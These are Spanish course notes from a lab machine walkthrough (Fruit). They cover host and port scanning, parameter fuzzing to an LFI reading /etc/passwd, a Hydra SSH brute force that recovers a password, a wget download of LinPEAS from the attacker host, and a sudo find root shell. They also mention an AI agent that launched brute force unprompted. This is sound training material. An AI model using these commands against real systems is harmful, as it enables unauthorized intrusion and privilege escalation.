---
tags:
- Repasos
date: '2026-09-02'
author: Carlos Castillo
---

# Repaso General II

<p class="note-meta">2026-09-02 · Carlos Castillo</p>

**REPASO GENERAL II**

Metodología de auditoría · Web · LFI · SSH · Escalada de privilegios

| **Fecha de clase** | 02/09/2026 |
| --- | --- |
| **Profesor** | Carlos Castillo |
| **Sesión** | Repaso General II |
| **Laboratorio / máquina** | Fruit |
| **Fuente** | Transcripción SRT de la sesión |
| **Criterio de elaboración**  Apuntes construidos únicamente a partir de la transcripción de la clase. Se han corregido errores evidentes de reconocimiento (por ejemplo, LinPEAS, WinPEAS, GTFOBins y PortSwigger), pero no se han añadido resultados, credenciales, puertos, payloads o pasos no respaldados por la sesión. |

| **Pendiente de confirmar**  La transcripción menciona la máquina Fruit y un entorno de laboratorio, pero no deja con claridad suficiente el nombre exacto de la plataforma. Por ello no se fija una plataforma concreta en estos apuntes. |
| --- |

# 1. Objetivos de la sesión

- Recuperar la metodología completa para afrontar una máquina después del parón de agosto.
- Revisar cómo descubrir y caracterizar un objetivo dentro de una red de laboratorio.
- Repasar enumeración de servicios con Nmap y priorización de puertos.
- Revisar enumeración web manual, descubrimiento de contenido y uso de fuzzing.
- Entender el razonamiento que conduce desde un indicio hasta confirmar una vulnerabilidad LFI/path traversal.
- Obtener acceso inicial por SSH a partir de la evidencia conseguida durante la enumeración.
- Repasar enumeración local y escalada de privilegios en Linux, tanto manual como asistida por LinPEAS.
- Reforzar la idea de trabajar por checkpoints y no depender ciegamente de herramientas de IA.

# 2. Resumen ejecutivo

La sesión se planteó como un repaso global de una máquina sencilla pero completa. Carlos Castillo utilizó la máquina Fruit para reconstruir el flujo mental de una auditoría: descubrir el objetivo, enumerar servicios, analizar la aplicación web, identificar una ruta no visible, inferir un posible LFI, fuzzear el parámetro, leer archivos locales, obtener un usuario válido, acceder por SSH y terminar con una escalada de privilegios basada en permisos de sudo sobre el binario find.

El mensaje metodológico fue constante: no hay una herramienta que “saque todo”. La información se obtiene por capas, se anota como checkpoints y cada hallazgo debe guiar el siguiente objetivo. Las herramientas automáticas ayudan a enumerar, pero no sustituyen el razonamiento ni confirman por sí solas una vulnerabilidad.

| **Idea central de la clase**  Pensar por checkpoints: “he encontrado esto → ¿qué implica? → ¿qué me falta? → cuál es la siguiente comprobación mínima?”. Esta forma de trabajar reduce la sensación de estar perdido y evita saltar directamente a explotación sin evidencia. |
| --- |

# 3. Mapa metodológico de la práctica

| **Fase** | **Objetivo** | **Evidencia obtenida** | **Siguiente decisión** |
| --- | --- | --- | --- |
| Planificación | Definir alcance y objetivo | Máquina Fruit en laboratorio autorizado | Trabajar paso a paso y no usar IA como piloto automático |
| Recogida de información | Descubrir host y servicios | 10.0.2.5; TTL 64; puertos 22 y 80 | Priorizar HTTP y conservar SSH como vía potencial |
| Análisis de vulnerabilidades | Entender la web y buscar contenido oculto | PHP; fruit.php; parámetro file; lectura de /etc/passwd | Confirmar LFI y extraer información útil |
| Pruebas de explotación controladas | Conseguir acceso y elevar privilegios | Usuario bananaman; SSH; sudo NOPASSWD sobre /usr/bin/find | Obtener shell root y finalizar la máquina |

# 4. Planificación

## 4.1. Volver a la metodología antes que a los comandos

Carlos insistió en que, tras un periodo sin practicar, lo importante no es recordar de memoria todos los flags, sino recuperar el mapa mental. La sesión se construyó obligando a razonar qué información se necesitaba en cada momento antes de ejecutar una herramienta.

- No empezar pensando en “cómo consigo root”.
- Dividir el problema en objetivos pequeños y comprobables.
- Explicar con palabras propias qué hace una herramienta antes de depender de su sintaxis.
- Usar IA como apoyo cuando haga falta, pero intentando entender y aprender lo que ejecuta.
- En examen o auditoría, anotar hallazgos para no perder pistas importantes.

| **Uso de IA durante la práctica**  Carlos permitió usar IA como apoyo, pero pidió no delegar el razonamiento. En la propia sesión se vio cómo una herramienta agente podía adelantarse, lanzar fuerza bruta e incluso resolver pasos sin que el alumno entendiera el proceso; el profesor pidió detenerla y hacer el recorrido manualmente. |
| --- |

# 5. Recogida de información

## 5.1. Descubrimiento de hosts con netdiscover

El primer objetivo fue descubrir qué dispositivos estaban presentes en la red del laboratorio. Se repasó netdiscover como herramienta para identificar IPs activas en el mismo segmento de red.

**Comando mencionado en clase**

| netdiscover |
| --- |

La máquina estaba configurada en una red 10.0.2.0/24. La transcripción identifica la máquina atacante como 10.0.2.6 y la máquina Fruit como 10.0.2.5. Carlos recordó que en modo puente el rango podría ser distinto, por ejemplo una red 192.168.x.0/24.

| **Interpretación**  netdiscover no “dice cuál es Fruit”. Solo da hosts visibles. El siguiente trabajo consiste en diferenciar puerta de enlace, equipo atacante y objetivo usando más evidencia. |
| --- |

## 5.2. Ping y TTL como indicio

Se utilizó ping como comprobación adicional para caracterizar hosts. En la sesión se observó un TTL 64 en la máquina objetivo, utilizado como indicio compatible con Linux. Carlos lo presentó como una pista, no como una certeza absoluta.

**Objetivo: comprobar respuesta y observar TTL**

| ping 10.0.2.5 |
| --- |

| **No convertir un indicio en una certeza**  El TTL ayuda a orientar, pero el sistema operativo debe confirmarse con más información. La clase insistió en ir acumulando evidencias. |
| --- |

## 5.3. Nmap: primero rapidez, después detalle

La estrategia consistió en separar el descubrimiento rápido de puertos de la enumeración más pesada. Primero se querían conocer los puertos abiertos. Después, únicamente sobre esos puertos, se aplicarían detección de versiones y scripts básicos.

**Reconstrucción fiel a partir de los parámetros dictados; el SRT no captura la línea completa escrita en pantalla.**

| nmap -p- --min-rate 5000 10.0.2.5 |
| --- |

Carlos mencionó también -n para evitar resolución DNS y -Pn como opción adicional, aunque indicó que no eran imprescindibles para este repaso.

**Reconstrucción fiel del segundo escaneo a partir de -z**

| **Lección práctica sobre máquinas de laboratorio**  Un servicio puede tardar en levantarse. Carlos recomendó conservar la posibilidad de repetir Nmap si algo no cuadra, especialmente en exámenes o máquinas recién iniciadas. |
| --- |

# 6. Análisis de vulnerabilidades: enumeración web

## 6.1. Priorización del puerto 80

Con SSH abierto pero sin credenciales iniciales, se priorizó la web. El razonamiento fue sencillo: HTTP ofrecía más superficie inmediata de enumeración, mientras que SSH se mantenía como posible vía posterior si aparecía un usuario, una contraseña o una clave.

Se revisó la página, se probaron funcionalidades visibles y se abrió el código fuente con Ctrl+U. La presencia de recursos y referencias PHP sirvió como indicio de que el backend interpretaba PHP.

| **PHP y código fuente**  Carlos recordó que Ctrl+U muestra la respuesta que entrega el servidor, no el código PHP ejecutado en el backend. Un archivo PHP que responde en blanco puede existir y estar ejecutándose aunque no muestre contenido visual. |
| --- |

## 6.2. Burp Suite: cuándo aporta valor

Durante el repaso se recordó Burp Suite como proxy de interceptación. Su utilidad principal, según la explicación de clase, es interceptar peticiones antes de que lleguen al servidor, modificarlas y reutilizarlas. El Repeater permite reenviar una petición interesante muchas veces con pequeños cambios sin repetir todo el flujo desde el navegador.

En ese momento concreto Carlos decidió que todavía no era necesario usar Burp: primero había que encontrar una petición, archivo o directorio realmente interesante.

## 6.3. Descubrimiento de contenido con dirsearch

Se utilizó dirsearch para descubrir rutas y archivos no enlazados desde la navegación normal. Carlos aprovechó para recordar que los diccionarios no deben usarse sin contexto: si la web parece PHP y el sistema no es Windows, buscar extensiones ASPX genera ruido innecesario.

- Se habló de buscar extensiones relevantes como PHP, HTML y TXT.
- Se recordó la búsqueda recursiva como posibilidad.
- Se insistió en revisar el manual/--help cuando no se recuerda un parámetro, en lugar de inventarlo.

| **Sintaxis exacta de dirsearch**  Durante la sesión hubo varias correcciones al recordar el flag de extensiones y el SRT no conserva con suficiente claridad la línea final ejecutada. Por fidelidad, estos apuntes no fijan un comando literal de dirsearch. |
| --- |

| **Hallazgo**  La enumeración acabó conduciendo a un archivo/ruta llamado fruit.php (en algunos momentos el reconocimiento de voz lo transcribe como fruits.php). La sesión lo trató como un PHP válido que respondía en blanco. |
| --- |

# 7. Análisis de vulnerabilidades: del indicio al LFI

## 7.1. Por qué fruit.php llamó la atención

La web inicial había mostrado una funcionalidad de búsqueda que terminaba en un recurso no encontrado. Después, la enumeración descubrió fruit.php, un recurso PHP que sí existía y respondía en blanco. Carlos planteó la hipótesis didáctica de que pudiera ser una versión en desarrollo o una funcionalidad todavía no integrada en la interfaz principal.

La hipótesis no se consideró una vulnerabilidad confirmada. El paso correcto era buscar qué entrada esperaba el script y comprobar si esa entrada permitía acceder a archivos locales.

## 7.2. Primer fuzzing: descubrir el parámetro

El problema era que se desconocía el nombre del parámetro GET. Probar “search” o “buscar” manualmente era razonable, pero no garantizaba nada. Por ello se usó Wfuzz para sustituir el nombre del parámetro por palabras de un diccionario.

**Reconstrucción de la estructura explicada en clase. El SRT conserva los flags, el diccionario, la posición de FUZZ y el payload /etc/passwd, pero no la línea completa copiada en el chat.**

| wfuzz -c --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://10.0.2.5/fruit.php?FUZZ=/etc/passwd" |
| --- |

Se añadió --hl=1 para ocultar respuestas de una línea y reducir ruido visual. Carlos corrigió durante la explicación que se trataba de líneas, no de longitud. También mencionó que Wfuzz permite filtrar por caracteres con otros parámetros.

| **Resultado**  El parámetro válido descubierto fue file. |
| --- |

## 7.3. Segundo fuzzing: probar la carga del LFI/path traversal

Una vez descubierto file, el problema cambiaba: ya se sabía dónde inyectar, pero había que averiguar qué representación del path aceptaba el backend. Carlos lo explicó como un “doble fuzzing” conceptual: primero el nombre del parámetro y después la forma de llegar al archivo.

- Traversal típico con ../ repetido.
- Variantes duplicadas cuando el backend elimina secuencias ../.
- Variantes codificadas en URL.
- Ruta absoluta como alternativa cuando la aplicación ya construye internamente el path.

**Forma que terminó funcionando en la práctica: ruta absoluta desde la raíz.**

| http://10.0.2.5/fruit.php?file=/etc/passwd |
| --- |

Carlos explicó que la aplicación parecía construir parte del path por detrás. Por ese motivo, en esta máquina la ruta absoluta /etc/passwd funcionó mientras que los intentos iniciales de traversal no eran la forma esperada.

| **Distinción terminológica usada en clase**  Carlos diferenció el path traversal como vulnerabilidad de recorrido de rutas y el LFI como el acceso efectivo a un archivo local. En la práctica ambos conceptos aparecieron juntos porque el objetivo era hacer que el PHP incluyera/leyera un archivo del sistema. |
| --- |

## 7.4. Qué extraer de un LFI

Tras confirmar la lectura de /etc/passwd, el objetivo dejó de ser “probar payloads” y pasó a ser “extraer información que abra una nueva vía”. La clase repasó que un LFI puede servir para leer archivos del sistema, configuraciones, logs, historiales o material relacionado con usuarios, siempre que existan y el proceso web tenga permisos de lectura.

| **Potencial no significa existente**  Carlos recalcó que una lista de rutas “interesantes” son candidatos. No debe asumirse que un archivo existe ni que es legible hasta comprobarlo. |
| --- |

# 8. Pruebas de explotación controladas: acceso inicial

## 8.1. Usuario bananaman y puerto SSH

La lectura de /etc/passwd permitió identificar el usuario bananaman. Al combinar este hallazgo con el puerto 22 abierto, SSH pasó de ser un servicio sin utilidad inmediata a una vía de acceso plausible.

| **Checkpoint**  Hallazgos acumulados: 1) SSH abierto. 2) Usuario válido bananaman. 3) Ya existe una razón concreta para probar autenticación. |
| --- |

## 8.2. Dos caminos discutidos para SSH

Carlos planteó dos posibilidades: fuerza bruta de contraseña con Hydra o búsqueda de una clave privada dentro del home del usuario. La segunda opción se explicó conceptualmente, pero en esta máquina no se encontró id\_rsa por esa vía.

**Ruta revisada como posible clave privada SSH; no se confirmó que existiera en la máquina.**

| /home/bananaman/.ssh/id\_rsa |
| --- |

**Sintaxis explicada para autenticarse con una clave privada si se obtiene una válida.**

| ssh bananaman@<IP> -i id\_rsa |
| --- |

También se explicó el modelo de clave pública/privada: la clave pública se autoriza en el servidor y la privada permanece en el cliente. En entornos empresariales es habitual deshabilitar autenticación por contraseña y exigir claves.

## 8.3. Fuerza bruta con Hydra

La vía que sí se utilizó en la práctica fue fuerza bruta sobre SSH. Se repasó la convención de Hydra: -l minúscula cuando ya conocemos un único usuario y -P mayúscula cuando aportamos un archivo con múltiples contraseñas. También se mencionó -t 8 para hilos.

**Estructura reconstruida con los elementos dictados; el nombre exacto del diccionario final no queda fijado de forma inequívoca en el SRT.**

| hydra -l bananaman -P <diccionario> -t 8 ssh://10.0.2.5 |
| --- |

| **Resultado de clase**  Hydra encontró la contraseña “Celtic” para el usuario bananaman. Con esas credenciales se obtuvo acceso por SSH a la máquina. |
| --- |

| **Ámbito autorizado**  La fuerza bruta se realizó dentro de la máquina de laboratorio. Carlos recordó durante la sesión que herramientas como Nmap y técnicas de fuerza bruta generan tráfico y no deben aplicarse fuera de un alcance autorizado. |
| --- |

# 9. Pruebas de explotación controladas: enumeración local y escalada

## 9.1. Enumeración manual

Una vez dentro por SSH, se volvió a la metodología. Primero se revisó la identidad del usuario y después se buscaron permisos delegados con sudo.

**Confirmar el usuario efectivo (bananaman).**

| whoami |
| --- |

**Listar comandos que el usuario puede ejecutar mediante sudo.**

| sudo -l |
| --- |

El resultado relevante indicaba que bananaman podía ejecutar /usr/bin/find mediante sudo sin contraseña (NOPASSWD). Carlos pidió no copiar directamente un payload: primero había que entender qué significaba el permiso y después buscar una técnica adecuada.

| **Vector confirmado**  sudo -l reveló un permiso NOPASSWD sobre /usr/bin/find. Este sí es un vector concreto de escalada porque el binario puede aprovecharse para ejecutar una shell con los privilegios con los que se invoca. |
| --- |

## 9.2. LinPEAS: enumeración automática, no explotación automática

La clase introdujo/repasó LinPEAS como script de enumeración local para Linux, perteneciente al proyecto PEASS-ng de Carlos Polop. También se mencionó WinPEAS para Windows. Carlos explicó que la herramienta ejecuta numerosas comprobaciones y presenta la información con colores para resaltar posibles vectores.

La idea clave fue que LinPEAS no “hace la escalada”. Enumera el contexto del usuario actual: interfaces, usuarios, ficheros, permisos, servicios, configuraciones y potenciales vectores. Si se cambia de usuario, conviene volver a ejecutarlo porque el contexto y los permisos pueden ser distintos.

| **Falsos positivos**  LinPEAS puede marcar información como interesante que después no sea explotable. El color sirve para priorizar revisión, no para confirmar una vulnerabilidad. |
| --- |

## 9.3. Transferencia de LinPEAS a la víctima

La víctima no tenía salida a Internet, por lo que no podía descargar directamente desde GitHub. Sin embargo, sí existía conectividad entre atacante y víctima. Se repasó el patrón clásico de transferencia: levantar un servidor HTTP local en la máquina atacante y descargar el archivo desde la víctima con wget.

**Comando reconstruido a partir de “Python 3”, “servidor web local” y “puerto 80” dictados en clase; la línea completa no quedó transcrita.**

| python3 -m http.server 80 |
| --- |

**Reconstrucción coherente con la IP atacante confirmada (10.0.2.6), wget y el archivo linpeas.sh mostrados en la sesión.**

| wget http://10.0.2.6/linpeas.sh |
| --- |

Carlos comprobó los logs del servidor HTTP y utilizó la respuesta 200 como evidencia de que la transferencia había sido atendida correctamente. También advirtió que un archivo puede existir con tamaño incorrecto o haberse descargado mal, por lo que conviene verificar la transferencia.

**Dar permiso de ejecución al script descargado.**

| chmod +x linpeas.sh |
| --- |

**Ejecutar la enumeración local.**

| ./linpeas.sh |
| --- |

## 9.4. Relación entre LinPEAS y sudo -l

LinPEAS volvió a resaltar el mismo permiso de sudo sobre find que ya se había visto manualmente. Esto sirvió para comparar ambos enfoques: si la vía es evidente con sudo -l, no es obligatorio lanzar una herramienta automática; LinPEAS aporta valor cuando queremos una revisión global o cuando necesitamos descubrir vectores que no tenemos en el mapa mental.

| **Metodología preferida**  Manual primero cuando la situación es clara; automatización como acelerador y segunda opinión. Si una herramienta produce cientos de líneas, hay que priorizar hallazgos y validarlos. |
| --- |

## 9.5. GTFOBins y explotación de find

Con el permiso confirmado, el siguiente paso metodológico fue consultar GTFOBins para ver cómo puede aprovecharse find cuando se permite ejecutarlo con sudo. La sesión terminó usando la variante que ejecuta una shell y la invoca explícitamente con sudo.

**Comando reconstruido a partir del payload de GTFOBins usado en pantalla y de la corrección verbal de “-quit” durante la sesión.**

| sudo find . -exec /bin/sh \; -quit |
| --- |

El primer intento se ejecutó sin sudo, por lo que seguía actuando como bananaman. Al repetirlo con sudo, el binario se ejecutó con los privilegios permitidos y se obtuvo una shell de root.

| **Resultado final**  Se alcanzó root y se pudo recoger la flag final. El valor de la flag no aparece en la transcripción y no se incluye en estos apuntes. |
| --- |

# 10. Comandos y usos vistos

| **Comando / elemento** | **Objetivo** | **Fase** | **Certeza** | **Notas** |
| --- | --- | --- | --- | --- |
| netdiscover | Descubrir hosts de la red | Recogida de información | Alta | Mencionado y usado como punto de partida. |
| ping 10.0.2.5 | Comprobar respuesta y TTL | Recogida de información | Alta | TTL 64 usado como indicio de Linux. |
| nmap -p- --min-rate 5000 10.0.2.5 | Descubrir puertos rápidamente | Recogida de información | Media | Línea reconstruida; parámetros dictados. |
| nmap -sCV -p 22,80 10.0.2.5 | Enumerar servicios/versions/scripts | Recogida de información | Media | Línea reconstruida; -sC/-sV y puertos confirmados. |
| Ctrl+U | Ver código fuente de la respuesta web | Análisis de vulnerabilidades | Alta | Útil para HTML; no revela backend PHP. |
| dirsearch | Descubrir rutas/archivos | Análisis de vulnerabilidades | Alta | Comando exacto final no queda legible en SRT. |
| wfuzz ... ?FUZZ=/etc/passwd | Descubrir parámetro GET | Análisis de vulnerabilidades | Media | Estructura reconstruida; file fue el parámetro válido. |
| /etc/passwd | Archivo objetivo para validar lectura local | Análisis de vulnerabilidades | Alta | Leído mediante el parámetro file. |
| /home/bananaman/.ssh/id\_rsa | Buscar posible clave privada | Análisis de vulnerabilidades | Alta | Ruta explorada, pero no confirmada como existente. |
| hydra -l bananaman -P <diccionario> ... | Fuerza bruta SSH | Pruebas de explotación controladas | Media | Estructura reconstruida; resultado Celtic confirmado. |
| ssh bananaman@<IP> -i id\_rsa | Autenticación con clave privada | Pruebas de explotación controladas | Alta | Explicado como alternativa conceptual. |
| whoami | Comprobar usuario | Pruebas de explotación controladas | Alta | Usuario: bananaman. |
| sudo -l | Enumerar permisos sudo | Pruebas de explotación controladas | Alta | Detectó NOPASSWD sobre /usr/bin/find. |
| python3 -m http.server 80 | Servir archivos desde atacante | Pruebas de explotación controladas | Media | Reconstruido; finalidad y puerto confirmados. |
| wget http://10.0.2.6/linpeas.sh | Transferir LinPEAS | Pruebas de explotación controladas | Media | Reconstrucción fiel a la explicación. |
| chmod +x linpeas.sh | Dar permiso de ejecución | Pruebas de explotación controladas | Alta | Dictado explícitamente. |
| ./linpeas.sh | Enumeración local automática | Pruebas de explotación controladas | Alta | Ejecutado en la víctima. |
| sudo find . -exec /bin/sh \; -quit | Abrir shell vía find con sudo | Pruebas de explotación controladas | Media | Reconstruido a partir de GTFOBins y correcciones verbales; resultado root confirmado. |

# 11. Errores, riesgos y buenas prácticas extraídas de la sesión

## 11.1. Errores de proceso que Carlos intentó corregir

- Querer llegar a root antes de haber construido el mapa de información.
- Probar un parámetro inventado una vez y descartar la hipótesis demasiado pronto.
- Lanzar herramientas con diccionarios/extensiones irrelevantes y generar ruido innecesario.
- Confundir una respuesta en blanco de PHP con “no existe”.
- Tomar la salida de LinPEAS como una vulnerabilidad ya confirmada.
- Copiar un payload de GTFOBins sin entender con qué usuario se está ejecutando.
- Dejar que una IA/agente continúe automáticamente hasta resolver la máquina sin revisar qué está haciendo.

## 11.2. Buenas prácticas reforzadas

- Mantener checkpoints de hallazgos: IP, SO probable, puertos, tecnología web, rutas, parámetros, usuarios y permisos.
- Reducir el espacio de búsqueda con contexto antes de aplicar fuerza bruta o fuzzing.
- Verificar descargas y transferencias de archivos, no asumir que un fichero descargado es íntegro.
- Repetir la enumeración local cuando se cambia de usuario porque cambia el contexto de permisos.
- Consultar documentación/manuales cuando no se recuerda una opción, en lugar de inventar sintaxis.
- Realizar este tipo de técnicas únicamente dentro del alcance autorizado de una práctica, CTF o auditoría.

# 12. Metodología reutilizable para próximas máquinas

1. Descubrir el objetivo dentro del rango autorizado (netdiscover u otra técnica de descubrimiento).
2. Obtener indicios de sistema operativo y disponibilidad (por ejemplo, ping/TTL).
3. Hacer un escaneo rápido de puertos para conocer la superficie.
4. Enumerar en profundidad solo los puertos relevantes.
5. Priorizar el servicio con mayor superficie inmediata y conservar el resto como pivotes posibles.
6. En web: navegar, revisar fuente/respuestas, identificar tecnología y descubrir contenido no enlazado.
7. Cuando aparezca un recurso interesante, formular una hipótesis concreta y diseñar la comprobación mínima.
8. Si falta el nombre de un parámetro, fuzzear el parámetro; si falta la carga, fuzzear el valor con un diccionario adecuado.
9. Una vez confirmada una vulnerabilidad, extraer información útil para el siguiente objetivo, no enumerar por enumerar.
10. Tras acceso inicial, comprobar identidad, permisos sudo y contexto local.
11. Usar LinPEAS/WinPEAS como enumeración complementaria, validando manualmente lo que marque.
12. Explotar únicamente un vector confirmado y verificar el cambio de privilegios.

# 13. Conexión con sesiones anteriores y siguientes

Esta clase fue explícitamente de repaso. Se retomaron conceptos ya vistos: Nmap, Burp Suite, dirsearch, Wfuzz, LFI/path traversal, Hydra, SSH, sudo -l, transferencia de archivos y escalada de privilegios.

Carlos recomendó repetir la máquina Fruit a quienes estuvieran oxidados. El objetivo era recuperar fluidez antes de volver a SQL Injection la semana siguiente. También se mencionaron próximos laboratorios de PortSwigger y más máquinas prácticas.

| **Pendiente para estudio**  Revisar teoría de LFI/path traversal, especialmente variantes de traversal, doble codificación/URL encoding y rutas absolutas, porque Carlos indicó que esa parte debe volver al mapa mental antes de las siguientes prácticas. |
| --- |

# 14. Checklist de estudio

- ☐ Puedo explicar por qué netdiscover no identifica por sí solo cuál es la máquina objetivo.
- ☐ Puedo explicar qué aporta el TTL y por qué no es una prueba definitiva del sistema operativo.
- ☐ Sé separar un Nmap de descubrimiento rápido de otro de enumeración detallada.
- ☐ Recuerdo por qué se priorizó HTTP frente a SSH al inicio.
- ☐ Puedo explicar qué hace Burp Repeater y cuándo aporta valor.
- ☐ Entiendo por qué un PHP en blanco puede existir y estar ejecutándose.
- ☐ Puedo explicar la diferencia entre descubrir el parámetro y fuzzear el valor.
- ☐ Entiendo por qué en Fruit funcionó una ruta absoluta para /etc/passwd.
- ☐ Puedo explicar cómo un usuario válido + SSH abierto cambia el siguiente objetivo.
- ☐ Sé distinguir fuerza bruta con Hydra de autenticación por clave privada SSH.
- ☐ Puedo explicar qué hace sudo -l y qué significa NOPASSWD.
- ☐ Entiendo que LinPEAS enumera y no escala automáticamente.
- ☐ Sé describir el flujo de transferencia con servidor HTTP local + wget.
- ☐ Puedo explicar por qué el payload de find debe ejecutarse con sudo para heredar privilegios root.

# 15. Registro de herramientas

| **Herramienta** | **Objetivo** | **Fase de auditoría** | **Comando/uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| netdiscover | Descubrimiento de hosts | Recogida de información | Enumerar IPs del segmento | Practicada | Repaso de descubrimiento de red. |
| ping | Caracterización básica | Recogida de información | TTL como indicio | Practicada | No usar TTL como certeza absoluta. |
| Nmap | Enumeración de puertos/servicios | Recogida de información | -p-, --min-rate, -sC, -sV | Recurrente | Primero rápido, luego detalle. |
| Burp Suite | Interceptar y repetir peticiones | Análisis de vulnerabilidades | Proxy + Repeater | Practicada | Recordatorio conceptual; no fue necesario al principio. |
| dirsearch | Descubrir contenido web | Análisis de vulnerabilidades | Rutas/extensiones | Practicada | Condujo a fruit.php. |
| Wfuzz | Fuzzing de parámetros/cargas | Análisis de vulnerabilidades | FUZZ, -w, -c, filtros | Practicada | Clave para descubrir file. |
| Hydra | Fuerza bruta de autenticación | Pruebas de explotación controladas | SSH con usuario conocido | Practicada | Vía usada para acceso inicial. |
| SSH | Acceso remoto | Pruebas de explotación controladas | Contraseña / clave privada | Practicada | Acceso como bananaman. |
| LinPEAS | Enumeración local | Pruebas de explotación controladas | linpeas.sh | Introducida | Automatiza enumeración, no explotación. |
| wget | Transferencia de archivos | Pruebas de explotación controladas | Descarga desde servidor local | Practicada | Útil sin Internet en la víctima. |
| Python http.server | Servidor HTTP temporal | Pruebas de explotación controladas | Servir directorio local | Practicada | Transferencia atacante → víctima. |
| GTFOBins | Referencia de abuso de binarios | Pruebas de explotación controladas | find con sudo | Practicada | Se consultó para el vector confirmado. |
| find | Binario usado en escalada | Pruebas de explotación controladas | sudo + -exec /bin/sh | Practicada | Permitido por sudo sin contraseña. |

# 16. Glosario

| **Término** | **Definición según el contexto de la clase** |
| --- | --- |
| Checkpoint | Punto de control mental o anotado que conserva un hallazgo y evita perder el hilo de la auditoría. |
| Enumeración | Proceso de obtener información concreta sobre hosts, servicios, rutas, usuarios, permisos o configuraciones. |
| Fuzzing | Prueba automatizada de múltiples valores sobre una posición concreta de una petición para descubrir entradas válidas o comportamientos distintos. |
| Path traversal | Vulnerabilidad que permite alterar la ruta prevista por la aplicación para acceder a ubicaciones fuera del directorio esperado. |
| LFI (Local File Inclusion) | Acceso/inclusión de archivos locales del servidor a través de una entrada controlable de la aplicación. |
| NOPASSWD | Regla de sudo que permite ejecutar un comando autorizado sin introducir contraseña. |
| LinPEAS | Script de enumeración local para Linux que recopila información y resalta posibles vectores de escalada. |
| GTFOBins | Referencia de técnicas para aprovechar comportamientos de binarios Unix cuando existen permisos o contextos favorables. |
| Clave privada SSH | Parte secreta de un par de claves usada por el cliente para autenticarse frente a una clave pública autorizada en el servidor. |

# 17. Actualización de memoria del proyecto

| **Categoría** | **Información nueva** | **Nivel de certeza** | **Acción futura** |
| --- | --- | --- | --- |
| Sesión | 02/09/2026 · Repaso General II · profesor Carlos Castillo. | Alta | Conectar con próximos apuntes de SQLi. |
| Laboratorio | Máquina Fruit usada como repaso global de metodología. | Alta | Repetirla para afianzar fluidez. |
| Metodología | Trabajar por checkpoints y extraer el siguiente objetivo de la evidencia real. | Alta | Aplicar el patrón en futuras máquinas. |
| Red | Objetivo 10.0.2.5; atacante 10.0.2.6 durante la práctica. | Alta | No reutilizar estas IPs en otros labs salvo evidencia. |
| Servicios | 22/SSH y 80/HTTP fueron los puertos relevantes. | Alta | Usarlos solo como datos de esta máquina. |
| Web | fruit.php y parámetro file condujeron a lectura local de /etc/passwd. | Alta | Revisar LFI/path traversal. |
| Acceso | Usuario bananaman; Hydra encontró contraseña Celtic; acceso por SSH. | Alta | Recordar que id\_rsa se exploró como alternativa, no como hallazgo confirmado. |
| Escalada | sudo -l mostró NOPASSWD sobre /usr/bin/find; GTFOBins permitió obtener root. | Alta | Reforzar sudo/GTFOBins. |
| Herramientas | LinPEAS se introduce como enumerador local; ejecutar de nuevo al cambiar de usuario. | Alta | Usar cuando aporte contexto, validando falsos positivos. |
| Pendiente | Plataforma exacta del laboratorio no queda inequívoca en el SRT. | Media | Confirmar si se necesita catalogar por plataforma. |
| **Resumen final para examen/laboratorio**  No memorices una “receta de Fruit”. Memoriza el proceso: descubrir → enumerar → formular hipótesis → validar → aprovechar el hallazgo para obtener nueva información → repetir. Las herramientas cambian; la metodología es lo reutilizable. |
